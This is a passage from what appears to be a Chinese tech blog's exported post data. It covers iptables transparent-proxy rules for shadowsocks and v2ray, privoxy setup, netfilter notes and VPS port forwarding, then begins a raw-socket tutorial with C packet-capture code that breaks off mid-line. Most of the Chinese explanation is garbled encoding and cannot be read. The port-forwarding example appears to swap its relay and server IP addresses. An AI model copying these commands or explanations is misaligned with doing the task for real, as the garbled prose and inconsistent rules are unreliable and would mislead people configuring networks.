shadowsocks&#39;s local port iptables -t nat -A SHADOWSOCKS -p tcp -j REDIRECT --to-ports 12345 # Add any UDP rules ip route add local default dev lo table 100 ip rule add fwmark 1 lookup 100 iptables -t mangle -A SHADOWSOCKS -p udp --dport 53 -j TPROXY --on-port 12345 --tproxy-mark 0x01/0x01 # Apply the rules iptables -t nat -A PREROUTING -p tcp -j SHADOWSOCKS iptables -t mangle -A PREROUTING -j SHADOWSOCKS # Start the shadowsocks-redir ss-redir -u -c /etc/config/shadowsocks.json -f /var/run/shadowsocks.pid ä»£ç†çš„åŸç†:å‚è€ƒss/ssr/v2ray/socks5 é€æ˜ä»£ç†é‡Œé¢çš„è§£é‡Š ss-redir æ˜¯ ss-libevã€ssr-libev ä¸­çš„ä¸€ä¸ªå·¥å…·ï¼Œé…åˆ iptables å¯ä»¥åœ¨ Linux ä¸Šå®ç° ssã€ssr é€æ˜ä»£ç†ï¼Œss-redir çš„é€æ˜ä»£ç†æ˜¯é€šè¿‡ DNAT å®ç°çš„ï¼Œä½†æ˜¯ udp åŒ…åœ¨ç»è¿‡ DNAT åä¼šæ— æ³•è·å–åŸç›®çš„åœ°å€ï¼Œæ‰€ä»¥ ss-redir æ— æ³•ä»£ç†ç»è¿‡ DNAT çš„ udp åŒ…ï¼›ä½†æ˜¯ ss-redir æä¾›äº†å¦ä¸€ç§ udp é€æ˜ä»£ç†æ–¹å¼ï¼šxt_TPROXY å†…æ ¸æ¨¡å—ï¼ˆä¸æ¶‰åŠ NAT æ“ä½œï¼‰ï¼Œé…åˆ iproute2 å³å¯å®ç° udp çš„é€æ˜ä»£ç†ï¼Œä½†ç¼ºç‚¹æ˜¯åªèƒ½ä»£ç†æ¥è‡ªå†…ç½‘ä¸»æœºçš„ udp æµé‡ã€‚å¼ºè°ƒä¸€ç‚¹ï¼Œåˆ©ç”¨ ss-redir å®ç°é€æ˜ä»£ç†å¿…é¡»ä½¿ç”¨ ss-libev æˆ– ssr-libevï¼Œpythonã€go ç­‰å®ç°ç‰ˆæœ¬æ²¡æœ‰ ss-redirã€ss-tunnel ç¨‹åºã€‚å½“ç„¶ï¼Œssã€ssr é€æ˜ä»£ç†å¹¶ä¸æ˜¯åªèƒ½ç”¨ ss-redir æ¥å®ç°ï¼Œä½¿ç”¨ ss-local + redsocks/tun2socks åŒæ ·å¯ä»¥å®ç° socks5ï¼ˆss-local æ˜¯ socks5 æœåŠ¡å™¨ï¼‰å…¨å±€é€æ˜ä»£ç†ï¼Œss-local + redsocks å®é™…ä¸Šæ˜¯ ss-redir çš„åˆ†ä½“å®ç°ï¼Œéƒ½æ˜¯é€šè¿‡ NAT è¿›è¡Œä»£ç†çš„ï¼Œå› æ­¤ä¹Ÿä¸èƒ½ä»£ç†æœ¬æœºçš„ udpï¼Œå½“ç„¶å†…ç½‘çš„ udp ä¹Ÿä¸èƒ½ä»£ç†ï¼Œå› ä¸º redsocks ä¸æ”¯æŒ xt_TPROXY æ–¹å¼ï¼ˆredsocks2 æ”¯æŒ TPROXY æ¨¡å—ï¼Œä½†æ˜¯ä¾æ—§æ— æ³•ä»£ç†æœ¬æœº udpï¼Œä¸è€ƒè™‘ï¼‰ã€‚æ‰€ä»¥è¿™é‡Œåªè®¨è®º ss-local + tun2socksï¼Œè¿™ä¸ªç»„åˆæ–¹å¼å…¶å®å’Œ Android ä¸Šçš„ VPN æ¨¡å¼å·®ä¸å¤šï¼ˆss-redir æˆ– ss-local + redsocks åˆ™æ˜¯ NAT æ¨¡å¼ï¼‰ï¼Œå› ä¸ºä¸æ¶‰åŠ NAT æ“ä½œï¼Œæ‰€ä»¥èƒ½å¤Ÿä»£ç†æ‰€æœ‰ tcpã€udp æµé‡ï¼ˆåŒ…æ‹¬æœ¬æœºã€å†…ç½‘çš„ udpï¼‰ã€‚å¾ˆæ˜¾ç„¶ï¼Œåˆ©ç”¨ tun2socks å¯ä»¥å®ç°ä»»æ„ socks5 é€æ˜ä»£ç†ï¼ˆä¸åªæ˜¯ ss/ssrï¼Œsshã€v2ray éƒ½å¯ä»¥ï¼Œåªè¦èƒ½æä¾› socks5 æœ¬åœ°ä»£ç†ï¼‰ã€‚æœ€åå†è¯´ä¸€ä¸‹ v2ray çš„é€æ˜ä»£ç†ï¼Œå…¶å®åŸç†å’Œ ss/ssr-libev ä¸€æ ·ï¼Œv2ray å¯ä»¥çœ‹ä½œæ˜¯ ss-localã€ss-redirã€ss-tunnel ä¸‰è€…çš„åˆä½“ï¼Œå› ä¸ºä¸€ä¸ª v2ray å®¢æˆ·ç«¯å¯ä»¥åŒæ—¶å……å½“è¿™ä¸‰ä¸ªè§’è‰²ï¼ˆå½“ç„¶ç«¯å£è¦ä¸ä¸€æ ·ï¼‰ï¼›æ‰€ä»¥ v2ray çš„é€æ˜ä»£ç†ä¹Ÿæœ‰ä¸¤ç§å®ç°æ–¹å¼ï¼Œä¸€æ˜¯åˆ©ç”¨å¯¹åº”çš„ ss-redir/ss-tunnel + iptablesï¼ŒäºŒæ˜¯åˆ©ç”¨å¯¹åº”çš„ ss-local + tun2socksï¼ˆè¿™å…¶å®å°±æ˜¯å‰é¢è¯´çš„ socks5 ä»£ç†ï¼‰ã€‚ shellä¸­å…¨å±€çš„httpä»£ç†å¯ä»¥è¿™ä¹ˆè®¾ç½® export http_proxy=http://127.0.0.1:8118; export https_proxy=$http_proxy //å¦‚æœæ˜¯socks5åè®®çš„è¯å¯ä»¥æ”¹ä¸€ä¸‹ export http_proxy=socks5://127.0.0.1:8118; export https_proxy=$http_proxy //åªå¯¹å½“å‰shellæœ‰æ•ˆ æ¥ä¸‹æ¥ï¼Œgitã€curlã€wget ç­‰å‘½ä»¤ä¼šè‡ªåŠ¨ä»ç¯å¢ƒå˜é‡ä¸­è¯»å– http ä»£ç†ä¿¡æ¯ï¼Œç„¶åé€šè¿‡ http ä»£ç†è¿æ¥ç›®çš„æœåŠ¡å™¨ã€‚ä½†æœ‰äº›è½¯ä»¶æ˜¯ä¸è®¤è¿™ä¸ªçš„ã€‚é‚£é—®é¢˜æ¥äº†ï¼Œss-local æä¾›çš„æ˜¯ socks5 ä»£ç†ï¼Œä¸èƒ½ç›´æ¥ä½¿ç”¨æ€ä¹ˆåŠï¼Ÿä¹Ÿç®€å•ï¼ŒLinux ä¸­æœ‰å¾ˆå¤šå°† socks5 åŒ…è£…ä¸º http ä»£ç†çš„å·¥å…·ï¼Œæ¯”å¦‚ privoxyã€‚åªéœ€è¦åœ¨ /etc/privoxy/config é‡Œé¢æ·»åŠ ä¸€è¡Œ forward-socks5 / 127.0.0.1:1080 .ï¼Œå¯åŠ¨ privoxyï¼Œé»˜è®¤ç›‘å¬ 127.0.0.1:8118 ç«¯å£ï¼Œæ³¨æ„åˆ«ææ··äº†ï¼Œ8118 æ˜¯ privoxy æä¾›çš„ http ä»£ç†åœ°å€ï¼Œè€Œ 1080 æ˜¯ ss-local æä¾›çš„ socks5 ä»£ç†åœ°å€ï¼Œå‘å¾€ 8118 ç«¯å£çš„æ•°æ®ä¼šè¢« privoxy å¤„ç†å¹¶è½¬å‘ç»™ ss-localã€‚æ‰€ä»¥æˆ‘ä»¬ç°åœ¨å¯ä»¥æ‰§è¡Œ export http_proxy=http://127.0.0.1:8118; export https_proxy=$http_proxy æ¥é…ç½®å½“å‰ç»ˆç«¯çš„ http ä»£ç†ï¼Œè¿™æ · gitã€curlã€wget è¿™äº›å°±ä¼šè‡ªåŠ¨èµ° ss-local å‡ºå»äº†ã€‚ Often, services on the computer communicate with each other by sending network packets to each other. They do this by utilizing a pseudo network interface called the loopback device, which directs traffic back to itself rather than to other computers.åŒä¸€å°æœºå™¨çš„ä¸åŒè¿›ç¨‹ä¹‹é—´æœ‰æ—¶å€™æ˜¯é€šè¿‡ä¸€ä¸ªè™šæ‹Ÿçš„ç½‘ç»œ(loopback device)è¿›è¡Œé€šä¿¡çš„ï¼Œæ‰€ä»¥ï¼Œå¿…é¡»è¦è®©iptableså…è®¸è¿™äº›é€šä¿¡$ sudo iptables -I INPUT 1 -i lo -j ACCEPT // -Içš„æ„æ€æ˜¯æ’å…¥ï¼Œå°±æ˜¯æ’å…¥åˆ°INPUTè¿™ä¸ªè§„åˆ™é‡Œé¢ã€‚ 1æ˜¯è¯´æ’åˆ°ç¬¬ä¸€ä½ï¼Œå› ä¸ºiptablesæ’åœ¨å‰é¢çš„ä¼˜å…ˆçº§é«˜ã€‚ -iæ˜¯interfaceçš„æ„æ€ï¼Œloå°±æ˜¯loopbackçš„ç®€ç§°ã€‚ï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œæ‰€æœ‰ä½¿ç”¨æœ¬åœ°loopbackè¿™ä¸ªinterfaceå‘è¿‡æ¥çš„åŒ…ï¼Œæ”¾è¡Œï¼‰ æ³¨æ„è¿˜éœ€è¦å°†ä¸Šè¿°è§„åˆ™æ·»åŠ åˆ°å¼€æœºå¯åŠ¨ä¸­ï¼Œæƒ³è¦æŒä¹…åŒ–çš„è¯å¥½åƒæœ‰ä¸€ä¸ªiptables-persistentï¼Œè¿˜æœ‰ä½¿ç”¨iptableså±è”½æ¥è‡ªæŸä¸ªå›½å®¶çš„IPçš„æ•™ç¨‹ é€æ˜ä»£ç†çš„å®ç°ss-libevçš„openwrtç§»æ¤å°±æ˜¯è¿™ä¹ˆå¹²çš„åœ¨ss-rules(å…¶å®å°±æ˜¯ä¸€ä¸ªshellè„šæœ¬)ä¸­ ipset -! restore create ss_spec_src_fw hash:ip hashsize 64 iptables-restore -n &lt;&lt;-EOF nat -A SS_SPEC_LAN_AC -m set --match-set ss_spec_src_fw src -j SS_SPEC_WAN_FW -A SS_SPEC_WAN_AC -m set --match-set ss_spec_dst_fw dst -j SS_SPEC_WAN_FW EOF ## è¿™ä¸ªEOFä¸»è¦ä¸ºäº†æ–¹ä¾¿æ¢è¡Œï¼Œmatch srcæ˜¯gfwlistçš„è½¬åˆ°SS_SPEC_WAN_FWè¿™ä¸ªchainä¸Š(å¤–é¢çš„æµé‡è¿›æ¥)ï¼Œdstæ˜¯gfwlistçš„ä¹Ÿè½¬åˆ°è¿™ä¸ªchainä¸Šã€‚ ## è€Œè¿™ä¸ªchain åªå¹²äº†ä¸€ä»¶äº‹ REDIRECT tcp -- anywhere anywhere redir ports 1080(æ¯”æ–¹è¯´local ss-redirç›‘å¬åœ¨è¿™ä¸ªç«¯å£çš„è¯) iptables -t nat -A SS_SPEC_WAN_FW -p tcp \\ -j REDIRECT --to-ports $local_port //tcpæµé‡å¯¼å‘ss-rediræœ¬åœ°ç›‘å¬ç«¯å£ iptables -t mangle -A SS_SPEC_WAN_FW -p udp \\ -j TPROXY --on-port $LOCAL_PORT --tproxy-mark 0x01/0x01 //udpè½¬å‘ UDP é€æ˜ä»£ç†æ˜¯é€šè¿‡ TPROXY æ–¹å¼å®ç°çš„ TPROXYæ˜¯LINUXå†…æ ¸ä¸ºæ”¯æŒé€æ˜ä»£ç†è€Œæä¾›çš„ä¸€é¡¹æ–°æŠ€æœ¯ã€‚æ‰€ä»¥åœ¨éƒ¨ç½²äº†ss-libev-luciçš„è·¯ç”±å™¨ä¸Šiptables -t nat -L éƒ½èƒ½çœ‹åˆ°è¿™äº›ä¸œè¥¿ã€‚äº‹å®ä¸Šåœ¨iptablesæ²¡æœ‰çœ‹åˆ°udpçš„å½±å­ï¼Œä½¿ç”¨çš„æ˜¯TPROXYã€‚ss-redirçš„åŸç†å¾ˆç®€å•ï¼šä½¿ç”¨iptableså¯¹PREROUTINGä¸OUTPUTçš„TCP/UDPæµé‡è¿›è¡ŒREDIRECTï¼ˆREDIRECTæ˜¯DNATçš„ç‰¹ä¾‹ï¼‰ï¼Œssâ€”rediråœ¨æ•è·ç½‘ç»œæµé‡åï¼Œé€šè¿‡ä¸€äº›æŠ€æœ¯æ‰‹æ®µè·å–REDIRECTä¹‹å‰çš„ç›®çš„åœ°å€ï¼ˆdstï¼‰ä¸ç«¯å£ï¼ˆportï¼‰ï¼Œè¿åŒç½‘ç»œæµé‡ä¸€èµ·è½¬å‘è‡³è¿œç¨‹æœåŠ¡å™¨ã€‚ä¸ºäº†åœ¨redirect UDPåè¿˜èƒ½å¤Ÿè·å–åŸæœ¬çš„dstå’Œportï¼Œss-rediré‡‡ç”¨äº†TPROXYã€‚Linuxç³»ç»Ÿæœ‰å…³TPROXYçš„è®¾ç½®æ˜¯ä»¥ä¸‹ä¸‰æ¡å‘½ä»¤ï¼š ip rule add fwmark 0x2333/0x2333 pref 100 table 100 ip route add local default dev lo table 100 iptables -t mangle -A PREROUTING -p udp -j TPROXY --tproxy-mark 0x2333/0x2333 --on-ip 127.0.0.1 --on-port 1080 å¤§æ„å°±æ˜¯åœ¨mangleè¡¨çš„PREROUTINGä¸­ä¸ºæ¯ä¸ªUDPæ•°æ®åŒ…æ‰“ä¸Š0x2333/0x2333æ ‡å¿—ï¼Œä¹‹ååœ¨è·¯ç”±é€‰æ‹©ä¸­å°†å…·æœ‰0x2333/0x2333æ ‡å¿—çš„æ•°æ®åŒ…æŠ•é€’åˆ°æœ¬åœ°ç¯å›è®¾å¤‡ä¸Šçš„1080ç«¯å£ï¼›å¯¹ç›‘å¬0.0.0.0åœ°å€çš„1080ç«¯å£çš„socketå¯ç”¨IP_TRANSPARENTæ ‡å¿—ï¼Œä½¿IPv4è·¯ç”±èƒ½å¤Ÿå°†éæœ¬æœºçš„æ•°æ®æŠ¥æŠ•é€’åˆ°ä¼ è¾“å±‚ï¼Œä¼ é€’ç»™ç›‘å¬1080ç«¯å£çš„ss-redirã€‚ æ–°å»ºè·¯ç”±è¡¨ 100ï¼Œå°†æ‰€æœ‰æ•°æ®åŒ…å‘å¾€ loopback ç½‘å¡ip route add local 0/0 dev lo table 100 æ·»åŠ è·¯ç”±ç­–ç•¥ï¼Œè®©æ‰€æœ‰ç» TPROXY æ ‡è®°çš„ 0x2333/0x2333 udp æ•°æ®åŒ…ä½¿ç”¨è·¯ç”±è¡¨ 100ip rule add fwmark 0x2333/0x2333 lookup 100 ipsetçš„è¯­æ³•å°±æ˜¯ä¸€å¤§å †ipçš„ä¸€ä¸ªé›†åˆï¼Œä½†æ˜¯å­˜çš„æ˜¯hashã€‚ iptablesçš„å‚æ•°å¯ä»¥ä¼  -m â€“match-set netfilteræ˜¯kernelçš„å®ç° Iptables is a standard firewall included in most Linux distributions by default (a modern variant called nftables will begin to replace it). It is actually a front end to the kernel-level netfilter hooks that can manipulate the Linux network stack. iptablesçš„å·¥ä½œæµç¨‹ direct the packet to the appropriate chain, check it against each rule until one matches, issue the default policy of the chain if no match is found a-deep-dive-into-iptables-and-netfilter-architecture iptableåœ¨é€æ˜ä»£ç†ä¸­çš„åŸç†å°±æ˜¯ä¿®æ”¹äº†packetçš„destination addressï¼ŒåŒæ—¶è¿˜è®°ä½äº†åŸæ¥çš„address iptables overwrites the original destination address but it remembers the old one. The application code can then fetch it by asking for a special socket option, SO_ORIGINAL_DSTè‘—åtcpä»£ç†redsockså°±æ˜¯ç”¨SO_ORIGINAL_DSTçš„ iptablesè§„åˆ™ç”Ÿæ•ˆåï¼Œä¸ä¼šææ–­ç°æœ‰çš„tcpè¿æ¥ DNATæ˜¯åœ¨PREROUTINGé“¾ä¸Šæ¥è¿›è¡Œçš„ï¼Œè€ŒSNATæ˜¯åœ¨æ•°æ®åŒ…å‘é€å‡ºå»çš„æ—¶å€™æ‰è¿›è¡Œï¼Œå› æ­¤æ˜¯åœ¨POSTROUTINGé“¾ä¸Šè¿›è¡Œçš„ dnatæ‰“LOGåªä¼šèµ°ä¸€æ¬¡The key thing to remember with iptables NAT is that only the first packet of each connection goes through the NAT tables. Once a connection is known any further packets for that connection (in both directions) are simply handled according to the existing mapping. (DNATåªä¼šåœ¨è¿æ¥å»ºç«‹ä¹‹åˆèµ°åˆ°) ä¿å­˜iptables-save -c &gt; iptables-backup.txtæ¢å¤iptables-restore -c &lt; iptables-backup.txt Linux é»˜è®¤ä¼šä¸ºæ‰€æœ‰è¿æ¥éƒ½åˆ›å»ºè¿æ¥è®°å½•é¡¹ï¼Œè€Œç»´æŠ¤è¿æ¥è·Ÿè¸ªè¡¨æ˜¯æœ‰å¼€é”€çš„ï¼Œè¦å‘½çš„æ˜¯è¿™ä¸ªè¡¨è¿˜æœ‰å¤§å°é™åˆ¶ï¼› cat /proc/sys/net/netfilter/nf_conntrack_maxï¼šå…è®¸çš„æœ€å¤§è¿æ¥è®°å½•é¡¹çš„æ•°ç›®ï¼Œè¶…è¿‡æ­¤å€¼åä¼šç›´æ¥æ‹’ç»æ–°è¿æ¥cat /proc/sys/net/netfilter/nf_conntrack_countï¼šæŸ¥çœ‹å½“å‰å·²ä½¿ç”¨çš„è¿æ¥è®°å½•é¡¹æ•°ç›®ï¼Œå¦‚æœå±…é«˜ä¸ä¸‹åˆ™åº”è€ƒè™‘ä¼˜åŒ–cat /proc/sys/net/netfilter/nf_conntrack_bucketsï¼šæŸ¥çœ‹å­˜å‚¨è®°å½•é¡¹çš„å“ˆå¸Œæ¡¶çš„æ•°ç›®ï¼Œé»˜è®¤ä¸º nf_conntrack_max / 4 å…ˆç»è¿‡ NAT table çš„ PREROUTING é“¾ï¼›ç»ç”±è·¯ç”±åˆ¤æ–­ç¡®å®šè¿™ä¸ªå°åŒ…æ˜¯è¦è¿›å…¥æœ¬æœºä¸å¦ï¼Œè‹¥ä¸è¿›å…¥æœ¬æœºï¼Œåˆ™ä¸‹ä¸€æ­¥ï¼›å†ç»è¿‡ Filter table çš„ FORWARD é“¾ï¼›é€šè¿‡ NAT table çš„ POSTROUTING é“¾ï¼Œæœ€åä¼ é€å‡ºå»ã€‚PREROUTINGä¼šä¿®æ”¹ç›®æ ‡IPï¼Œ POSTROUTINGé“¾ä¼šä¿®æ”¹æ¥æº IPï¼Œ é€šå¸¸æˆ‘ä»¬çš„ NAT å†…ç½‘è½¬å¤–ç½‘æ˜¯ä¿®æ”¹æ¥æº IPï¼ˆå³å†…ç½‘ IPï¼‰ï¼Œæˆä¸ºæ¥æº NATï¼ˆSource NAT, SNATï¼‰ã€‚ æµé‡quotaé™é¢ iptables -A INPUT -p tcp â€“dport 80 -m quota â€“quota 52428800 -j ACCEPTiptables -A INPUT -p tcp â€“dport 80 -j DROPiptablesä»ä¸€å°vpsè½¬åˆ°å¦å¤–ä¸€å°vps(äº²æµ‹å¯è¡Œ)é¦–å…ˆå¼€å¯ipè½¬å‘ echo -e &quot;net.ipv4.ip_forward=1&quot; &gt;&gt; /etc/sysctl.conf sysctl -p ä¸­è½¬æœºå™¨ä¸º1.1.1.1ï¼Œ å®¢æˆ·ç«¯å¡«å†™çš„serveripæ˜¯1.1.1.1,server portæ˜¯10000ï¼ŒæœåŠ¡å™¨2.2.2.2ç›‘å¬åœ¨30000ç«¯å£ã€‚ iptables -t nat -A PREROUTING -p tcp -m tcp --dport 10000 -j DNAT --to-destination 1.1.1.1:30000 iptables -t nat -A PREROUTING -p udp -m udp --dport 10000 -j DNAT --to-destination 1.1.1.1:30000 iptables -t nat -A POSTROUTING -d 1.1.1.1 -p tcp -m tcp --dport 30000 -j SNAT --to-source 2.2.2.2 iptables -t nat -A POSTROUTING -d 1.1.1.1 -p udp -m udp --dport 30000 -j SNAT --to-source 2.2.2.2 å¯ä»¥æŠŠæ‰€æœ‰å‘å¾€1.1.1.1:10000ç«¯å£çš„æµé‡è½¬å‘åˆ°2.2.2.2:30000ç«¯å£ å‚è€ƒlinux-iptables-examplesç½‘ä»¶R7800 OpenWrtä½¿ç”¨V2Ray+mKcp+é€æ˜ä»£ç†å®Œç¾ç¿»å¢™list and delete iptables ruleså¦‚ä½•åˆ›å»ºå¹¶ç®¡ç†è‡ªå®šä¹‰çš„iptablesçš„chain","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"åŸå§‹å¥—æ¥å­—å­¦ä¹ æŒ‡å—","date":"2019-01-19T22:20:35.000Z","path":"2019/01/19/2019-01-19-learning-from-raw-socket/","text":"ä»åŸå§‹å¥—æ¥å­— SOCK_RAWå­¦ä¹ åˆ°çš„çŸ¥è¯† ä»¥ä¸‹å›¾ç‰‡ç›—è‡ªchinaunixä¸€ç¯‡è®²è§£raw socketçš„æ–‡ç« ï¼Œæ„Ÿè°¢åŸä½œè€…çš„è¾›å‹¤å·¥ä½œã€‚å¤ä¹ ä¸€ä¸‹ipåŒ…çš„ç»“æ„ã€‚ è¿™æ˜¯IP packet è¿™æ˜¯TCP header è¿™æ˜¯IP header è¿™æ˜¯mac header ä»å†…æ ¸ä»£ç æ¥çœ‹ï¼Œè¿™äº›åˆ†åˆ«å¯¹åº”ethhdrã€iphdrã€tcphdrã€udphdrç­‰ç»“æ„ä½“ã€‚ ä¸€èˆ¬æ¥è®²ï¼Œåº”ç”¨å±‚ç¨‹åºçš„æ•°æ®éƒ½æ˜¯åœ¨tcpæˆ–è€…udpçš„dataä¸­çš„ï¼Œå®é™…å‘é€è¿‡ç¨‹ä¸­ï¼Œå†…æ ¸ä¼šå¸®å¿™æ·»åŠ ä¸Štcp headerï¼Œip headerä»¥åŠmac headerç­‰æ•°æ®ï¼Œå¼€å‘è€…æ— éœ€å…³å¿ƒä¹Ÿæ— ä»å¹²æ¶‰ã€‚raw socketä¸ºæˆ‘ä»¬æä¾›äº†ç›´æ¥è¯»å†™è¿™å—æ•°æ®çš„æ–¹æ³•ã€‚ Cè¯­è¨€ä¸­raw socketçš„åˆ›å»ºæ–¹å¼ä¸º: socket(AF_INET, SOCK_RAW, protocol); //éœ€è¦rootæƒé™ raw socketä¸€èˆ¬ç”¨äºç½‘ç»œç›‘æµ‹ç¨‹åºä¸­æ¯”è¾ƒå¤šï¼Œæ¯”å¦‚ping , nmapè¿™ç§ã€‚è¿™ç±»åè®®æ˜¯æ²¡æœ‰ç«¯å£çš„ã€‚ å¦ä¸€ç§åœºæ™¯æ˜¯ä¼ªé€ tcp headeråº”å¯¹è¿è¥å•†udpå±è”½å’Œæµé‡qosï¼Œè¿™ç§ç±»ä¼¼çš„å®ç°åœ¨2017å¹´å‡ºæ¥çš„æ¯”è¾ƒå¤šã€‚(å°±æ˜¯ç”¨ä¸€ä¸ªraw socketæŠŠä¸€ä¸ªudpåŒ…ä¼ªè£…æˆä¸€ä¸ªtcpåŒ…)ã€‚ æ¥ä¸‹æ¥è¿™ä¸ªä¾‹å­æ˜¯ä½¿ç”¨raw socketç›‘å¬serverç«¯æ”¶åˆ°çš„ip packetåŒ…å†…å®¹server.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/socket.h&gt; #include &lt;sys/types.h&gt; #include &lt;linux/if_ether.h&gt; #include &lt;stdlib.h&gt; #include &lt;arpa/inet.h&gt; int main() { printf(&quot;main is running\\n&quot;); int iSock, nRead, iProtocol; char buffer[4096] = {0}; char *ethhead, *iphead, *tcphead, *udphead, *icmphead, *p; if((iSock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP))) &lt; 0) { printf(&quot;create iSocket error, check root\\n&quot;); // éœ€è¦rootæƒé™ï¼Œ æœ€åè¿è¡Œçš„æ—¶å€™ï¼Œ å¯ä»¥ç”¨sudo ./server return 1; } while(1) { nRead = recvfrom(iSock, buffer, 2048, 0, NULL, NULL); /* ä»¥å¤ªç½‘å¸§å¤´ 14 ipå¤´ 20 udpå¤´ 8 æ€»å…±42å­—èŠ‚(æœ€å°‘) */ if(nRead &lt; 42) { printf(&quot;packet error\\n&quot;); continue; } int n = 0XFF; char szVisBuf[1024] = {0}; for(unsigned int i = 0; i &lt; nRead; ++i) { char szTmp[3] = {0}; sprintf(szTmp, &quot;%02x&quot;, buffer[i]&amp;n); strcat(szVisBuf, szTmp); } ethhead = buffer; p = ethhead; iphead = ethhead + 14; p = iphead + 12; char szIps[128] = {0}; snprintf(szIps, sizeof(szIps), &quot;IP: %d.%d.%d.%d =&gt; %d.%d.%d.%d&quot;, p[0]&amp;n, p[1]&amp;n, p[2]&amp;n, p[3]&amp;n, p[4]&amp;n, p[5]&amp;n, p[6]&amp;n, p[7]&amp;n); iProtocol = (iphead + 9)[0]; p = iphead + 20; unsigned int iDstPort = (p[2]&lt;&lt;8)&amp;0xff00 | p[3]&amp;n; switch(iProtocol) { case IPPROTO_UDP : if(iDstPort == 8888) { printf(&quot;source port: %u,&quot;,(p[0]&lt;&lt;8)&amp;0xff00 | p[1]&amp;n); printf(&quot;dest port: %u\\n&quot;, iDstPort); printf(&quot;%s\\n&quot;, szIps); printf(&quot;%s\\n&quot;, szVisBuf); printf(&quot;nRead is %d\\n&quot;, nRead); } break; case IPPROTO_RAW : printf(&quot;raw\\n&quot;); break; default: break; } } } client.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;sys/socket.h&gt; #include &lt;netinet/in.h&gt; #include &lt;arpa/inet.h&gt; #include &lt;unistd.h&gt; int main() { struct sockaddr_in srvAddr; bzero(&amp;srvAddr, sizeof(srvAddr)); srvAddr.sin_family = AF_INET; srvAddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); srvAddr.sin_port = htons(8888); int iSock = socket(AF_INET, SOCK_DGRAM, 0); // udp int i = 0; while(1) { printf(&quot;press enter to send data\\n&quot;); while (( i = getchar()) != &#39;\\n&#39;){ char szBuf[32] = {0}; snprintf(szBuf, sizeof(szBuf), &quot;hello %d&quot;, ++i); sendto(iSock, szBuf, strlen(szBuf) + 1, 0, (struct sockaddr *)&amp;srvAddr, sizeof(srvAddr)); } } close(iSock); return 0; } ä»raw socket æ¥å—è¿‡æ¥çš„buffer çš„åœ°å€æ˜¯æ•°æ®é“¾è·¯å±‚çš„åœ°å€ï¼Œå…·ä½“æˆ‘ä»¬è·å–çš„ä¸œè¥¿å°±æ˜¯é€šè¿‡åç§»é‡æ¥ï¼Œè¿™ä¸ªåç§»é‡æˆ‘ä»¬éœ€è¦æŸ¥çœ‹ç½‘ç»œä¹¦æˆ–è€…æŠ“ä¸ªåŒ…åˆ†æä¸‹é“¾è·¯å±‚çš„æ•°æ®æ ¼å¼ç­‰ç­‰ã€‚clientå¾ˆç®€å•ï¼Œå°±æ˜¯ä¸€ä¸ªudpå‘åŒ…åˆ°localhostï¼Œå…³é”®åœ¨äºserverè¿™è¾¹ï¼š iSock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP) è¿™ä¸ªsocketèƒ½å¤Ÿç›‘å¬æœ¬æœºæ¥æ”¶åˆ°çš„æ‰€æœ‰ip packetï¼Œæ¥æ”¶åˆ°çš„æ•°æ®å¸§çš„å¤´6ä¸ªå­—èŠ‚æ˜¯ç›®çš„åœ°çš„MACåœ°å€ï¼Œç´§æ¥ç€6ä¸ªå­—èŠ‚æ˜¯æºMACåœ°å€ , å¦‚æœæ˜¯udpæˆ–è€…tcpçš„è¯ï¼Œè¿˜èƒ½è¯»å–åˆ°portã€‚ä¹Ÿå°±æ˜¯ä¸€äº›å¸¸ç”¨æŠ“åŒ…å·¥å…·çš„å®ç°åŸç†ã€‚ æ‰€ä»¥å¯ä»¥å†™ä¸€ä¸ªç®€å•çš„æŠ“åŒ…å·¥å…·ï¼Œå°†é‚£äº›å‘ç»™æœ¬æœºçš„IPV4æŠ¥æ–‡å…¨éƒ¨æ‰“å°å‡ºæ¥ã€‚ #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;errno.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/socket.h&gt; #include &lt;sys/types.h&gt; #include &lt;netinet/in.h&gt; #include &lt;netinet/ip.h&gt; #include &lt;netinet/if_ether.h&gt; int main(int argc, char **argv) { int sock, n; char buffer[2048]; struct ethhdr *eth; struct iphdr *iph; if (0 &gt; (sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP)))) { perror(&quot;socket&quot;); exit(1); } while (1) { printf(&quot;=====================================\\n&quot;); //æ³¨æ„ï¼šåœ¨è¿™ä¹‹å‰æˆ‘æ²¡æœ‰è°ƒç”¨bindå‡½æ•°ï¼Œraw socketè¿™ä¸€å±‚å·²ç»ä¸å­˜åœ¨portçš„æ¦‚å¿µäº† n = recvfrom(sock, buffer, 2048, 0, NULL, NULL); printf(&quot;%d bytes read\\n&quot;, n); //æ¥æ”¶åˆ°çš„æ•°æ®å¸§å¤´6å­—èŠ‚æ˜¯ç›®çš„MACåœ°å€ï¼Œç´§æ¥ç€6å­—èŠ‚æ˜¯æºMACåœ°å€ã€‚ eth = (struct ethhdr*)buffer; printf(&quot;Dest MAC addr:%02x:%02x:%02x:%02x:%02x:%02x\\n&quot;,eth-&gt;h_dest[0],eth-&gt;h_dest[1],eth-&gt;h_dest[2],eth-&gt;h_dest[3],eth-&gt;h_dest[4],eth-&gt;h_dest[5]); printf(&quot;Source MAC addr:%02x:%02x:%02x:%02x:%02x:%02x\\n&quot;,eth-&gt;h_source[0],eth-&gt;h_source[1],eth-&gt;h_source[2],eth-&gt;h_source[3],eth-&gt;h_source[4],eth-&gt;h_source[5]); iph = (struct iphdr*)(buffer + sizeof(struct ethhdr)); //æˆ‘ä»¬åªå¯¹IPV4ä¸”æ²¡æœ‰é€‰é¡¹å­—æ®µçš„IPv4æŠ¥æ–‡æ„Ÿå…´è¶£ if(iph-&gt;version == 4 &amp;&amp; iph-&gt;ihl == 5){ unsigned char *sd, *dd; sd = (unsigned char*)&amp;iph-&gt;saddr; dd = (unsigned char*)&amp;iph-&gt;daddr; printf(&quot;Source Host: %d.%d.%d.%d Dest host: %d.%d.%d.%d\\n&quot;, sd[0], sd[1], sd[2], sd[3], dd[0], dd[1], 